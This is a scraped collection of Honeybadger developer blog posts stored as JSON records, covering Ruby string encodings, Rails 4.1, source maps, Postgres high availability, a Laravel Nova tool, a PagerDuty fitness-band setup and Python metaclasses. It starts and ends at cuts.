\"🙂\" . bytes . map { | e | e . to_s 2 } # [\"11110000\", \"10011111\", \"10011001\", \"10000010\"] And if we wanted a string, we could use join: \"🙂\" . bytes . map { | e | e . to_s 2 }. join ( ' ' ) # 11110000 10011111 10011001 10000010 UTF-8 has more space than needed for Unicode Another important aspect of UTF-8 is that it can include all the Unicode values (or code points) -- and not only the ones that exist today but also those that will exist in the future. This is because in UTF-8, with the 4-byte template, we have 21 slots to fill. That means we could store up to 2^21 (= 2,097,152) values, way more than the largest amount of Unicode values we'll ever have with the standard, around 1.1 million. This means we can use UTF-8 with the confidence that we won't need to switch to another encoding system in the future to allocate new characters or languages. Working with different encodings in Ruby In Ruby, we can see right away the encoding of a given string by doing this: 'Hello' . encoding . name # \"UTF-8\" We could also encode a string with a different encoding system. For example: encoded_string = 'hello, how are you?' . encode ( \"ISO-8859-1\" , \"UTF-8\" ) encoded_string . encoding . name # ISO-8859-1 If the transformation is not compatible, we get an error by default. Let's say we want to convert \"hello 🙂\" from UTF-8 to ASCII. Since the emoji \"🙂\" doesn't fit in ASCII, we can't. Ruby raises an error in that case: \"hello 🙂\" . encode ( \"ASCII\" , \"UTF-8\" ) # Encoding::UndefinedConversionError (U+1F642 from UTF-8 to US-ASCII) But Ruby allows us to have exceptions where, if a character can't be encoded, we can replace it with \"?\". \"hello 🙂\" . encode ( \"ASCII\" , \"UTF-8\" , undef: :replace ) # hello ? We also have the option of replacing certain characters with a valid character in the new encoding: \"hello 🙂\" . encode ( \"ASCII\" , \"UTF-8\" , fallback: { \"🙂\" => \":)\" }) # hello :) Inspecting a script's encoding of a script in Ruby To see the encoding of the script file you're working on, the \".rb\" file, you can do the following: __ENCODING__ # This will show \"#<Encoding:UTF-8>\" in my case. From Ruby 2.0 on, the default encoding for Ruby scripts is UTF-8, but you can change that with a comment in the first line: # encoding: ASCII __ENCODING__ # #<Encoding:US-ASCII> But it's better to stick to the UTF-8 standard unless you have a very good reason to change it. Some tips for working with encodings in Ruby You can see the whole list of supported encodings in Ruby with Encoding.name_list . This will return a big array: [\"ASCII-8BIT\", \"UTF-8\", \"US-ASCII\", \"UTF-16BE\", \"UTF-16LE\", \"UTF-32BE\", \"UTF-32LE\", \"UTF-16\", \"UTF-32\", \"UTF8-MAC\"... The other important aspect when working with characters outside the English language is that before Ruby 2.4, some methods like upcase or reverse didn't work as expected. For example, in Ruby 2.3, upcase doesn't work as you'd think: # Ruby 2.3 'öıüëâñà' . upcase # 'öıüëâñà' The workaround was using ActiveSupport, from Rails, or another external gem, but since Ruby 2.4 we have full Unicode case mapping: # From Ruby 2.4 and up 'öıüëâñà' . upcase # 'ÖIÜËÂÑÀ' Some fun with emojis Let's see how emojis work in Unicode and Ruby: '🖖' . chars # [\"🖖\"] This is the \"Raised Hand with Part Between Middle and Ring Fingers,\" also known as the \"Vulcan Salute\" emoji. If we have the same emoji but in another skin tone that's not the default, something interesting happens: '🖖🏾' . chars # [\"🖖\", \"🏾\"] So instead of just being one character, we have two for one single emoji. What happened there? Well, some characters in Unicode are defined as the combination of several characters. In this case, if the computer sees these two characters together, it shows just one with the skin tone applied. There's another fun example we can see with flags. '🇦🇺' . chars # [\"🇦\", \"🇺\"] In Unicode, the flag emojis are internally represented by some abstract Unicode characters called \"Regional Indicator Symbols\" like 🇦 or 🇿. They're usually not used outside flags, and when the computer sees the two symbols together, it shows the flag if there is one for that combination. To see for yourself, try to copy this and remove the comma in any text editor or field: 🇦,🇺 Conclusion I hope this review of how Unicode and UTF-8 work and how they relate to Ruby and potential errors was useful to you. The most important lesson to take away is to remember that when you're working with any kind of text you have an associated encoding system, and it's important to keep it present when storing it or changing it. If you can, use a modern encoding system like UTF-8 so you don't need to change it in the future. Note about Ruby releases I've used Ruby 2.6.5 for all the examples in this article. You can try them in an online REPL or locally by going to your terminal and executing irb if you have Ruby installed. Since Unicode support has been improved in the last releases, I opted to use the latest one so this article will stay relevant. In any case, with Ruby 2.4 and up, all the examples should work as shown here.", "date": "2020-01-28"},
{"website": "Honey-Badger", "title": "What everybody ought to know about Ruby on Rails 4.1", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-on-rails-4-new-features-changes/", "abstract": "One of the most important things to know about Rails 4.1 is that even the beta version is stable enough for some companies to use it in production. For example, Basecamp began Rails 4.1 beta1 . Other important features from the release notes include the Spring application preloader, changes to config/secrets.yml, Action Pack variants, and Action Mailer previews. You can find the full list of changes by reviewing the list of commits in the GitHub repository for Rails. Spring application preloader In previous versions of Rails you would need to setup Spring if you wanted to keep your applications active between tests, rake tasks, and migrations. Not having Spring, your applications would need to boot for each of these events. When Spring was configured, the development process was sped up because the application would stay running in the background. Now, in Rails 4.1, new applications will automatically take advantage of Spring to speed up development and keep your application running in the background. config/secrets.yml In the config folder of Rails 4.1, you will now find a secrets.yml file. This is used to manage the secret_key_base for your application. Additionally, this file can be used to store other keys like the ones used for external APIs. Action Pack variants Depending on the devices accessing your application, you may want to render different HTML, XML, or JSON. This allows you to configure your app to look great on different devices like tablets, phones, and laptops. The variant can be set in a before_action and your app can respond to variants in the same way it responds to formats. You will also need to provide templates for each variant and format. Action Mailer previews Creating an Action Mailer was cumbersome in previous versions of Rails. Previously, you would need to send test emails to see what was being delivered to a client and to get the formatting right. Now, in Rails version 4.1, you can use Action Mailer previews to see what an email will look like by visiting a special URL. By default, these are located at test/mailers/previews, but that can be changed with the preview_path during configuration.", "date": "2014-01-07"},
{"website": "Honey-Badger", "title": "Debugging Source Maps", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/debugging-source-maps/", "abstract": "You've got bugs, but they're hiding inside your minified JavaScript. Source maps are the key to finding them. Unfortunately, they can be difficult to set up. Luckily, you're a flippin' Honeybadger. We've got your back with the documentation and tools you need swat those bugs. Good news, JavaScript peeps! We just shipped two big improvements to help with debugging source maps: The new Debug Tool can help you figure out why specific frames in your stack traces aren't being translated The Uploaded Source Maps list (under project settings) now supports filtering by minified URL and revision Why Source Maps? Source maps are essential for tracking JavaScript errors. By the time it reaches your end-users, your production JavaScript looks nothing like the JavaScript you wrote when building your app. Modern build processes have multiple stages where your original source code gets chopped up, optimized, and compressed to squeeze the best performance from it. That's great for performance, but terrible for debugging (and error tracking). Source maps are the answer. Source maps allow Honeybadger to show your original source code, even if your production code looks like this: (function(n){function e(e){for(var r,u,a=e[0],l=e[1],c=e[2],s=0,p=[];s<a.length;s++)u=a[s],o[u]&&p.push(o[u][0]),o[u]=0;}); Unfortunately, source maps can be difficult to set up. Build tools tend to handle them differently, there are a lot of configuration options to get just right , and dealing with obfuscated code is just challenging by nature. Don't worry, though—Honeybadger has your back. The New Debug Tool We built the new Debug Tool specifically for our customers, in response to common support tickets—it's the quickest way to dig into why your stack traces aren't being translated. To get started, make sure your Honeybadger project's language is set to \"Client-side JavaScript\" under Project Settings → Edit , then navigate to Project Settings → Source Maps → Debug Tool . Follow the instructions on the page. Fill in a URL to your minified JavaScript, the line and column numbers, and the revision, and then run the test. If Honeybadger has a source map for the information you provided, it will show you the translated source line. What if it's not working? If Honeybadger is unable to find a source map for some reason, the debug tool will tell you why; this is the real magic—it can help you troubleshoot the issue. For example, if you enter the correct revision, but the minified URL is wrong, it will give you a helpful error message. Finding Uploaded Source Maps To see a list of all source maps which have been uploaded to Honeybadger, make sure your Honeybadger project's language is set to \"Client-side JavaScript\" under Project Settings → Edit , and then, navigate to Project Settings → Source Maps → Uploaded Source Maps . You can now filter your uploaded source maps using the minified URL and revision. This can be used to verify that a particular source map was uploaded. If you're using wildcards , you can paste the full minified URL into the Minified URL input, and the filter will apply the wildcard search to the results, returning the source map that we're using to translate the minified file. Getting Started with Source Maps If you're not using source maps yet, start here ; it's our guide on using source maps with Honeybadger, and the most up to date version of everything we know. We're working on tooling to make uploading source maps to Honeybadger easier. For example, Webpack users can install the honeybadger-webpack plugin and call it a day. If we don't support your build system yet, you can still use our API to upload your source maps directly .", "date": "2018-12-10"},
{"website": "Honey-Badger", "title": "Our Postgres Infrastructure", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/our-postgres-infrastructure/", "abstract": "Since I'm the one at Honeybadger primarily responsible for ops, and since we rely heavily on Postgres for everything we do, the Gitlab incident struck close to home.  We have fortunately never had a comparable failure at Honeybadger, but at a previous startup I did manage to wipe out the production database by mistake, so I know how it feels.  Having read what happened at Gitlab, and having just made some big changes to our infrastructure at Honeybadger, I thought now would be a good time to share how we run a sizeable Postgres installation. If nothing else, this will provide some additional documentation for Starr and Josh, should I ever get hit by a bus. :) Backups & Distaster Recovery When we first started Honeybadger we didn't have to worry much about scaling our database.  The traffic was low enough that we just deployed a primary server and a backup server and used the default configuration options (with tuning by pg_tune).  The only setup beyond installing the apt packages was configuring the replication.  I set up streaming replication from the primary to the secondary, and I also set up wal-e on the primary to save the WAL segments to S3. This allowed for the secondary to catch up the primary from the WALs on s3 should the replication lag get so large that the WALs weren't available on the primary.  It also allowed for disaster recovery in a separate datacenter, if necessary.  In the worst case scenario, we could spin up a new server in another datacenter, restore from the latest full backup generated by wal-e, then load the rest of the WALs to get the new Postgres server up to date.  I later set up a hot-standby in a separate datacenter using exactly this method, and used streaming replication to keep that server in sync along with the in-datacenter replica. Connection Pooling As we added more customers and our workload increased, we added more sidekiq workers to handle the load.  There was nothing remarkable about this until we hit the maximum number of collections allowed in our Postgres configuration.  Eventually we ended up allowing 1024 connections, and at that point we decided we needed to bring in a connection pooler to take the load off the database.  I evaluated pgpool and pgbouncer, and pgbouncer ended up working better for us.  I really wanted the failover benefits that pgpool offered, but pgbouncer proved more stable, so I delayed my dream of having automated database failover.  Using pgbouncer in transaction mode (and setting prepared_statements: false in database.yml ) greatly reduced the number of active connections to Postgres, and it has been rock solid. High Availibility We recently moved from leasing bare metal servers to hosting everything at EC2.  When I made this change, I knew it was time to stop pretending that servers don't die (since EC2 instances die all the time) and to come up with a database failover scenario that wouldn't involve one of us waking up at 3am.  Achieving HA with a traditional relational database seems to be one of the eternal quests of operators, so it was with some trepidation that I once again set this goal for myself.  I wasn't prepared to switch from pgbouncer to pgpool, so I looked for other options.  Fortunately, in the time since I had last looked for a solution, two new, good candidates arrived on the scene: Stolon and Patroni .  After evaluting both, I opted for Patroni, and I got to work integrating it into our environment.  It took a bit of head scratching to figure out how to get a Patroni-controlled Postgres instance to follow and fail over from a non-Patroni-controlled instance (our primary at the old datacenter), but I eventually got it, and it worked like a charm when it came time to do the cutover. Failover Patroni has high-availability covered — if the leader Postgres instance dies, a leader election happens and one of the followers gets promoted to be the new leader.  To handle failover, though, I had to find a way to get that change communicated to the pgbouncer instances.  This task is handled by consul-template .  Once the leader change is registered in Consul, the consul-template daemon running along-side each pgbouncer instance updates the pgbouncer configuration with the location of the new leader and reloads pgbouncer, which then relays database traffic to the new leader without breaking the database connection that the Rails application has with pgbouncer.  Amazingly, it all seems to work. :) Happy Servers, Happy Humans It's been a lot of fun scaling up Honeybadger and making the infrastructure more resilient to failure.  Kudos to all those who have created and contributed to the open source projects we use to make that happen!", "date": "2017-02-01"},
{"website": "Honey-Badger", "title": "Honeybadger for Laravel Nova", "author": ["Marcel Pociot"], "link": "https://www.honeybadger.io/blog/honeybadger-for-laravel-nova/", "abstract": "In the last weeks, I've been working with the team from Honeybadger on a custom resource tool to add Honeybadger error tracking output to Laravel Nova. It's a great addition to Nova and allows the developer to easily get access to error tracking information that, for example, is associated with specific users. Why Laravel Nova? Honeybadger already has a great Laravel package available , that takes care of tracking errors that occur in your Laravel application. If you want to take a look at these errors you will then get an email from Honeybadger every time your application has an error to see things like the stack trace of the specific error and maybe even some user or context-related information, you can go to the Honeybadger dashboard and take an in-depth look. The idea behind a Laravel Nova tool is quite simple - since Laravel Nova is an admin panel, it makes perfect sense to be able to see your errors inside of the dashboard itself. Errors with context The cool thing about the Honeybadger Laravel integration is that it automatically adds the context of the currently logged in user to the occurring exceptions. This means that every exception that happens while a user is logged in, is automatically tracked as belonging to a specific user ID. The Laravel Nova resource tool makes use of this. It allows you to see errors that were created for a particular user. In order to use the Honeybadger resource tool in your Nova application, all you need to do is add it to the resource that you want to associate with the errors. For example, users: public function fields ( Request $request ) { return [ ID :: make () -> sortable (), // Your other fields new \\ HoneybadgerIo\\NovaHoneybadger\\Honeybadger , ]; } By default, this is going to look for the resource's id and use it as the user_id and this will give you an output in Nova, similar to this: Of course you can also modify the way that the Honeybadger errors will be looked up, by defining custom \"context\" strings - a search query language from Honeybadger to lookup previously defined error contexts. public function fields ( Request $request ) { return [ ID :: make () -> sortable (), // Your other fields \\ HoneybadgerIo\\NovaHoneybadger\\Honeybadger :: fromContextKeyAndAttribute ( 'context.user.email' , 'email' ), ]; } This would not search for a user ID, but instead lookup all errors that have a context.user.email attribute that is equal to the email column value of the resource that is currently being inspected. Behind the scenes Behind the scenes, this is built using a custom Nova resource tool , which is essentially a regular Laravel package that extends Laravel Nova. There were some interesting findings that I made while working on the resource tool. Since users will load this resource tool into their specific resources, I needed to be able to access the underlying Eloquent model, so that I can perform Honeybadger API requests with the correct context attributes. In the example above, I would need to access the resource model's email attribute. Custom Nova resource tools are Vue components, that receive two attributes to identify the eloquent model that is being used: resourceName resourceId The resourceId is pretty self-explanatory - it's the database ID of the resource that you are currently looking at.\nBut the resourceName is something different. It is more of a slug representation of the resource class that you currently use. For example, a User resource has a resourceName of users . A Post resource has posts , etc. But here's the catch: The developer can also change this URI key, by overriding it in their resource class like this: /**\n * Get the URI key for the resource.\n *\n * @return string\n */ public static function uriKey () { return 'blog-posts' ; } In this case, the Post resource class has a resourceName of blog-posts . So how can we retrieve the Laravel Eloquent model that is being used for the combination of resourceName and resourceId ? Luckily Laravel Nova got you covered and provides a custom NovaRequest class - this class behaves like a regular Laravel Request class, but has some additional helper methods. One of which is findModelOrFail . Defining the route In order to use the findModelOrFail method, you first need to define a route that accepts the resource name and the ID. This route is defined inside of our custom Nova resource tool. Route :: get ( '/{resource}/{resourceId}' , 'ToolController@fetch' ); The naming of these parameters is important, as these names are being used inside of the NovaRequest class. Next, it's time to implement the ToolController fetch method: use Laravel\\Nova\\Http\\Requests\\NovaRequest ; class ToolController { public function fetch ( NovaRequest $request ) { $model = $request -> findModelOrFail ( $request -> resourceId ); } } Just make sure to import the NovaRequest class and typehint it in your controller method, to make use of it. Then you can call one of the various helper methods to access models or resources that belong to the incoming resource name and ID. I had a lot of fun building this resource tool and learned a lot of new, interesting things about how Laravel Nova works internally. If you want to use a great error tracking library in combination with Laravel and Nova, you should take a look at Honeybadger .", "date": "2018-10-02"},
{"website": "Honey-Badger", "title": "How I hacked a fitness tracker to wake me - but not my wife - when I get paged", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-i-hacked-a-fitness-tracker-to-wake-me-but-not-my-wife-when-i-get-paged/", "abstract": "Being on call sucks. Getting woken up at 3am by a loud buzzer and instantly having to identify and fix some technical problem in a system that you're only somewhat familiar with...let's just say that the experience is equal to any horror Kafka could dream up. ...The only thing worse than getting woken up is also waking up your wife or husband. And the only thing worse than that is waking up your newborn. Since we have a baby on the way I figured I'd better solve this problem, and fast. I wound up hacking together a solution that uses one of those fitness tracker wristbands in conjunction with my android phone to wake me - and only me - when an alert comes in from PagerDuty. Here's how I did it. The Wrist Band The Sony SWR10 smartband has a vibrate on alert feature I decided to go with the Sony Smartband SWR10 . By all accounts, it's a fairly mediocre fitness tracker. But it has the ability to vibrate whenever a notification happens on my android device. For some reason most fitness trackers don't have this feature, even though it seems like a no-brainer. Overall I'm quite happy with this little device. It's small and lightweight. I don't even notice when I wear it to bed. It holds a charge for about 5 days, and a range of around 30 feet. Pairing it with my Galaxy S5 wasn't too difficult. I did have to download some crappy sony apps to make it work, but that's life. So I told the SmartConnect app to buzz me whenever the PagerDuty app sent a notification. The result was kind of sad. One pitiful little buzz. It might be enough to get my attention when I'm awake, but it's sure as hell not enough to wake me up at 3am. ...back to the drawing board. Introducing Tasker Tasker is probably the nerdiest Android app you can buy. It lets you create little \"programs\" that are run whenever some event happens on your phone. An event like the PagerDuty app trying to wake me up in the middle of the night. I wanted to make tasker intercept the pagerduty notification and buzz my wristband over and over until I turned it off. Now, I was ready to have to do some actual hackety hacking to get the smartband to take orders from tasker. But luckily for me someone hadalready done it. Mark Challoner has written an open source plugin for Tasker which lets it order the Smartband around. You can find it on github here . There's also a smartband tasker plugin in the app store , which is the one I used.  This app has one of my favorite app reviews of all time. See sidebar. Creating the Tasker \"programs\" So in tasker, programs are called \"profiles.\" We need to create two of them. The first will cause the smartband to start buzzing when the PagerDuty notice comes in. The second is to shut off the buzzing when I open the PagerDuty app on my phone. The \"start buzzing\" program Create a new profile For the trigger, select \"Event\" > \"UI\" > \"Notification\". Click on \"owner application\" and select pagerduty. For the action, select \"Plugins\" > \"Smartband\" Name the action something  like \"smartband\" In the smartband settings, tell it to repeat every two seconds. This is actually really important. If you have it repeat any faster, the smartband seems to want to disconnect from the phone. Trigger the profile whenever a PD notification happens. Buzz the smartband every 2 seconds, forever. The \"stop buzzing\" program Create a new profile For the trigger, choose \"Application\" then select Pagerduty. For the action, select \"Plugins\" > \"Smartband\" and tell it to cancel all notifications. Stop buzzing the smartband when I open the pagerduty app", "date": "2015-08-17"},
{"website": "Honey-Badger", "title": "Understanding Object Instantiation and Metaclasses in Python", "author": ["Rupesh Mishra"], "link": "https://www.honeybadger.io/blog/python-instantiation-metaclass/", "abstract": "In this article, we will cover the object instantiation process followed by Python internally to create objects. I'll start with the fundamentals of object creation, and then we'll dive deep into understanding specific methods, such as __new__ , __init__ , and __call__ . We will also understand the Metaclass in Python, along with its role in the object creation process. Although these are advanced topics, the article explains each topic step-by-step and from scratch so that even beginners can understand it. Please note that this article is written with Python3 in mind. Table of Contents Internals of Object Instantiation and Metaclass in Python Table of Contents The object base class in Python3 Objects and types in Python Metaclass in Python The object instantiation process in Python The __new__ method Override the __new__ method The __init__ method The __call__ method callable() Conclusion References The object base class in Python3 In Python3, all classes implicitly inherit from the built-in object base class. The object class provides some common methods, such as __init__ , __str__ , and __new__ , that can be overridden by the child class. Consider the code below, for example: class Human : pass In the above code, the Human class does not define any attributes or methods. However, by default, the Human class inherits the object base class and as a result it has all the attributes and methods defined by the object base class. We can check all the attributes and the methods inherited or defined by the Human class using the dir function. The dir function returns a list of all the attributes and methods defined on any Python object. dir ( Human ) # Output: [ '__class__' , '__delattr__' , '__dict__' , '__dir__' , '__doc__' , '__eq__' , '__format__' , '__ge__' , '__getattribute__' , '__gt__' , '__hash__' , '__init__' , '__init_subclass__' , '__le__' , '__lt__' , '__module__' , '__ne__' , '__new__' , '__reduce__' , '__reduce_ex__' , '__repr__' , '__setattr__' , '__sizeof__' , '__str__' , '__subclasshook__' , '__weakref__' ] The dir function's output shows that the Human class has lots of methods and attributes, most of which are available to the Human class from the object base class. Python provides a __bases__ attribute on each class that can be used to obtain a list of classes the given class inherits. The __bases__ property of the class contains a list of all the base classes that the given class inherits. print ( Human . __bases__ ) # Output: (<class 'object'>,) The above output shows that the Human class has object as a base class. We can also look at the attributes and methods defined by the object class using the dir function. dir ( object ) # Output: [ '__class__' , '__delattr__' , '__dir__' , '__doc__' , '__eq__' , '__format__' , '__ge__' , '__getattribute__' , '__gt__' , '__hash__' , '__init__' , '__init_subclass__' , '__le__' , '__lt__' , '__ne__' , '__new__' , '__reduce__' , '__reduce_ex__' , '__repr__' , '__setattr__' , '__sizeof__' , '__str__' , '__subclasshook__' ] The above definition of the Human class is equivalent to the following code; here, we are explicitly inheriting the object base class. Although you can explicitly inherit the object base class, it's not required! class Human ( object ): pass object base class provides __init__ and __new__ methods that are used for creating and initializing objects of a class. We will discuss __init__ and __new__ in detail in the latter part of the tutorial. Objects and types in Python Python is an object-oriented programming language. Everything in Python is an object or an instance. Classes, functions, and even simple data types, such as integer and float, are also objects of some class in Python. Each object has a class from which it is instantiated. To get the class or the type of object, Python provides us with the type function and __class__ property defined on the object itself. Let's understand the type function with the help of simple data types, such as int and float . # A simple integer data type a = 9 # The type of a is int (i.e., a is an object of class int) type ( a ) # Output: <class 'int'> # The type of b is float (i.e., b is an object of the class float) b = 9.0 type ( b ) # Output: <class 'float'> Unlike other languages, in Python, 9 is an object of class int , and it is referred by the variable a . Similarly, 9.0 is an object of class float and is referred by the variable b . type is used to find the type or class of an object. It accepts an object whose type we want to find out as the first argument and returns the type or class of that object. We can also use the __class__ property of the object to find the type or class of the object. __class__ is an attribute on the object that refers to the class from which the object was created. a . __class__ # Output: <class 'int'> b . __class__ # Output: <class 'float'> After simple data types, let's now understand the type function and __class__ attribute with the help of a user-defined class, Human . Consider the Human class defined below: # Human class definition class Human : pass # Creating a Human object human_obj = Human () The above code creates an instance human_obj of the Human class. We can find out the class (or type of human_obj ) from which human_obj was created using either the type function or the __class__ property of the human_obj object. # human_obj is of type Human type ( human_obj ) # Output: <class '__main__.Human'> human_obj . __class__ # Output: <class '__main__.Human'> The output of type(human_obj) and human_obj.__class__ shows that human_obj is of type Human (i.e., human_obj has been created from the Human class). As functions are also objects in Python, we can find their type or class using the type function or the __class__ attribute. # Check the type of the function def simple_function (): pass type ( simple_function ) # Output: <class 'function'> simple_function . __class__ # Output: <class 'function'> Thus, simple_function is an object of the class function . Classes from which objects are created are also objects in Python. For example, the Human class (from which human_obj was created) is an object in itself. Yes, you heard it right! Even classes have a class from which they are created or instantiated. Let's find out the type or class of the Human class. class Human : pass type ( Human ) # Output: <class 'type'> Human . __class__ # Output: <class 'type'> Thus, the above code shows that the Human class and every other class in Python are objects of the class type . This type is a class and is different from the type function that returns the type of object. The type class, from which all the classes are created, is called the Metaclass in Python. Let's learn more about metaclass. Metaclass in Python Metaclass is a class from which classes are instantiated or metaclass is a class of a class. Earlier in the article, we checked that variables a and b are objects of classes int and float , respectively. As int and float are classes, they should have a class or metaclass from which they are created. type ( int ) # Output: <class 'type'> type ( float ) # Output: <class 'type'> # Even type of object class is - type type ( object ) # Output: <class 'type'> Thus, the type class is the metaclass of int and float classes. The type class is even the metaclass for the built-in object class, which is the base class for all the classes in Python. As type itself is a class, what is the metaclass of the type class? The type class is a metaclass of itself! type ( type ) # Output: <class 'type'> Metaclass is the least talked about topic and is not normally used very much in daily programming. I delve into this topic because metaclass plays an essential role in the object creation process that we will cover later in the article. The two important concepts that we have covered so far are as follows: All classes in Python are objects of the type class, and this type class is called Metaclass . Each class in Python, by default, inherits from the object base class. The object instantiation process in Python With a basic understanding of the Metaclass and objects in Python, let's now understand the object creation and initialization process in Python. Consider the Human class, as defined below: class Human : def __init__ ( self , first_name , last_name ): self . first_name = first_name self . last_name = last_name human_obj = Human ( \"Virat\" , \"Kohli\" ) isinstance ( human_obj , Human ) # Output: True # As object is the base class for all the class hence\n# isinstance(human_obj, object) is True isinstance ( human_obj , object ) # Output: True The output of the above code shows that human_obj is an instance of class Human with the first_name as Virat and the last_name as Kohli . If we look at the above code closely, it's natural to have some questions: Per the definition of the Human class, we don't return anything from the __init__ method; how does calling the Human class return the human_obj ? We know that the __init__ method is used for initializing the object, but how does the __init__ method get self ? In this section, we will discuss each of these questions in detail and answer them. Object creation in Python is a two-step process. In the first step, Python creates the object, and in the second step, it initializes the object. Most of the time, we are only interested in the second step (i.e., the initialization step). Python uses the __new__ method in the first step (i.e., object creation) and uses the __init__ method in the second step (i.e., initialization). If the class does not define these methods, they are inherited from the object base class. As the Human class does not define the __new__ method, during the object instantiation process, the __new__ method of the object 's class is called, while for initialization, the __init__ method of the Human class is called. Next, we'll cover each of these methods in detail. The __new__ method The __new__ method is the first step in the object instantiation process. It is a static method on the object class and accepts cls or the class reference as the first parameter. The remaining arguments( Virat and Kohli ) are passed while calling the class - Human(\"Virat\", \"Kohli\") . The __new__ method creates an instance of type cls (i.e., it allocates memory for the object by invoking the superclass' i.e. object class' __new__ method using super().__new__(cls) ). It then returns the instance of type cls . Usually, it does not do any initialization, as that is the job of the __init__ method. However, when you override the __new__ method, you can also use it to initialize the object or modify it as required before returning it. __new__ method signature # cls - is the mandatory argument. Object returned by the __new__ method is of type cls @ staticmethod def __new__ ( cls [,...]): pass Override the __new__ method We can modify the object creation process by overriding the __new__ method of the object class. Consider the example below: class Human : def __new__ ( cls , first_name = None ): # cls = Human. cls is the class using which the object will be created. # Created object will be of type cls. # We must call the object class' __new__ to allocate memory obj = super (). __new__ ( cls ) # This is equivalent to object.__new__(cls) # Modify the object created if first_name : obj . name = first_name else : obj . name = \"Virat\" print ( type ( obj )) # Prints: <__main__.Human object at 0x103665668> # return the object return obj # Create an object\n# __init__ method of `object` class will be called. virat = Human () print ( virat . name ) # Output: Virat sachin = Human ( \"Sachin\" ) print ( sachin . name ) # Output: Sachin In the above example, we have overridden the __new__ method of the object class. It accepts the first arguments as cls - a class reference to the Human class. The __new__ method is a special case in Python. Although it's a static method of the object class, on overriding it, we do not have to decorate it with the staticmethod decorator. Inside the __new__ method of the Human class, we are first calling the __new__ method of the object class using super().__new__(cls) . The object class' __new__ method creates and returns the instance of the class, which is passed as an argument to the __new__ method. Here, as we are passing cls (i.e., the Human class reference); the object 's __new__ method will return an instance of type Human . We must call the object class' __new__ method inside the overridden __new__ method to create the object and allocate memory to the object. The __new__ method of the Human class modifies the obj returned from the __new__ method of the object class and adds the name property to it. Thus, all objects created using the Human class will have a name property. Voila! We have modified the object instantiation process of the Human class. Let's consider another example. In this example, we are creating a new class called Animal and overriding the __new__ method. Here, when we are calling the __new__ method of the object class from the __new__ method of the Animal class, instead of passing the Animal class reference as an argument to the __new__ method of the object class, we are passing the Human class reference. Hence, the object returned from the __new__ method of the object class will be of type Human and not Animal . As a result, the object returned from calling the Animal class (i.e., Animal() ) will be of type Human . class Animal : def __new__ ( cls ): # Passing Human class reference instead of Animal class reference obj = super (). __new__ ( Human ) # This is equivalent to object.__new__(Human) print ( f \"Type of obj: { type ( obj ) } \" ) # Prints: Type of obj: <class '__main__.Human'> # return the object return obj # Create an object cat = Animal () # Output:\n# Type of obj: <class '__main__.Human'> type ( cat ) # Output: <class '__main__.Human'> The __init__ method The __init__ method is the second step of the object instantiation process in Python. It takes the first argument as an object or instance returned from the __new__ method. The remaining arguments are the arguments passed while calling the class (Human(\"Virat\", \"Kohli\")) . These arguments are used for initializing the object. The __init__ method must not return anything. If you try to return anything using the __init__ method, it will raise an exception, as shown below: class Human : def __init__ ( self , first_name ): self . first_name = first_name return self human_obj = Human ( 'Virat' ) # Output: TypeError: __init__() should return None, not 'Human' Consider a simple example to understand both the __new__ and __init__ method. class Human : def __new__ ( cls , * args , ** kwargs ): # Here, the __new__ method of the object class must be called to create # and allocate the memory to the object print ( \"Inside new method\" ) print ( f \"args arguments { args } \" ) print ( f \"kwargs arguments { kwargs } \" ) # The code below calls the __new__ method of the object's class. # Object class' __new__ method allocates a memory # for the instance and returns that instance human_obj = super ( Human , cls ). __new__ ( cls ) print ( f \"human_obj instance - { human_obj } \" ) return human_obj # As we have overridden the __init__ method, the __init__ method of the object class will not be called def __init__ ( self , first_name , last_name ): print ( \"Inside __init__ method\" ) # self = human_obj returned from the __new__ method self . first_name = first_name self . last_name = last_name print ( f \"human_obj instance inside __init__ { self } : { self . first_name } , { self . last_name } \" ) human_obj = Human ( \"Virat\" , \"Kohli\" ) # Output\n# Inside new method\n# args arguments ('Virat', 'Kohli')\n# kwargs arguments {}\n# human_obj instance - <__main__.Human object at 0x103376630>\n# Inside __init__ method\n# human_obj instance inside __init__ <__main__.Human object at 0x103376630>: Virat, Kohli In the above code, we have overridden both the __new__ and __init__ method of the object 's class. __new__ creates the object ( human_obj ) of type Human class and returns it. Once the __new__ method is complete, Python calls the __init__ method with the human_obj object as the first argument. The __init__ method initializes the human_obj with first_name as Virat and last_name as Kohli . As object creation is the first step, and initialization is the second step, the __new__ method will always be called before the __init__ method Both __init__ and __new__ are called magic methods in Python. Magic methods have names that begin and end with __ (double underscores or \"dunder\"). Magic methods are called implicitly by the Python; you do not have to call them explicitly. For example, both the __new__ and __init__ method are called implicitly by Python. Let's cover one more magic method, __call__ . The __call__ method The __call__ method is a magic method in Python that is used to make the objects callable. Callable objects are objects that can be called. For example, functions are callable objects, as they can be called using the round parenthesis. Consider an example to better understand callable objects: def print_function (): print ( \"I am a callable object\" ) # print_function is callable as it can be called using round parentheses print_function () # Output\n# I am a callable object Let's try to call an integer object. As integer objects are not callable, calling them will raise an exception. a = 10 # As the integer object is not callable, calling `a` using round parentheses will raise an exception. a () # Output: TypeError: 'int' object is not callable callable() The callable function is used to determine whether an object is callable. The callable function takes the object reference as an argument and returns True if the object appears to be callable or False if the object is not callable. If the callable function returns True , the object might not be callable; however, if it returns False , then the object is certainly not callable. # Functions are callable callable ( print_function ) # Output: True # Interger object is not callable callable ( a ) # Output: False Let's determine whether the classes in Python are callable. Here, we will determine whether the Human class defined earlier is callable. callable ( Human ) # Output: True Yes, classes in Python are callable, and they should be! Don't you think so? When we call the class, it returns the instance of that class. Let's find out whether the objects created from the class are callable. human_obj = Human ( \"Virat\" , \"Kohli\" ) callable ( human_obj ) # Output: False # Let's try calling the human_obj human_obj () # As human_obj is not callable it raises an exception\n# Output: TypeError: 'Human' object is not callable So, human_obj is not callable though the class of human_obj (i.e., the Human class is callable). To make any object in Python callable, Python provides the __call__ method that needs to be implemented by the object's class. For example, to make human_obj object callable, the Human class has to implement the __call__ method. Once the Human class implements the __call__ method, all the objects of the Human class can be invoked like functions (i.e., using round parentheses). class Human : def __init__ ( self , first_name , last_name ): print ( \"I am inside __init__ method\" ) self . first_name = first_name self . last_name = last_name def __call__ ( cls ): print ( \"I am inside __call__ method\" ) human_obj = Human ( \"Virat\" , \"Kohli\" ) # Output: I am inside __init__ method # Both human_obj() and human_obj.__call__() are equaivalent human_obj () # Output: I am inside __call__ method human_obj . __call__ () 